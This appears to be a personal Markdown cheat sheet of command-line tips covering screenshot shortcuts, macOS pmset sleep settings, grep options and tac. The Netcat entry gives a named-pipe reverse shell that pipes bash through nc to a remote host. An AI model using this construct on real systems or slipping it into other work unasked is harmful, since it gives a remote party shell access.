# Screenshots
## OS X
- Command-Shift-3: Full screen to desktop
- Command-Shift-4, select an area: Area to desktop
- Command-Shift-4, space, click a window: Window to desktop
- Command-Control-Shift-3: Full screen to clipboard
- Command-Control-Shift-4, select an area: Area to clipboard
- Command-Control-Shift-4, space, click a window: Window to clipboard

## Windows
- PrtScr: full screenshot to clipboard
- Windows-PrtScr: full screen to "Screenshots" folder
- Alt-PrtScr: active window to clipboard


# OS X Power Saving
- Temporarily turn off sleep
```
sudo pmset noidle
```
- Turn off sleep
```
sudo pmset sleep 0
```
- Sleep after 15 minutes
```
sudo pmset sleep 15
```

# Netcat
- When -e flag does not exist:
```
mknod /tmp/datapipe p
/bin/bash 0</tmp/datapipe | nc remote.host.com port 1>/tmp/datapipe
```

# grep
- multiple search terms:
```
grep -e term1 -e term2 <file>
```

- exclude term:
```
grep -v term <file>
```

- exclude multiple terms:
```
grep -v -e term1 -e term2 <file>
```

- Print file names and line numbers for matches:
```
grep -Hn term
```

# tac (backwards cat)

This is part of the *GNU coreutils* package. It reads and prints a
file from the bottom up. VERY useful for logfiles.

- Linux
```
tac logfile | less
```

- OS X / BSD
```
gtac logfile | less
```

- BSD *tail -r*
```
tail -r logfile | less
```
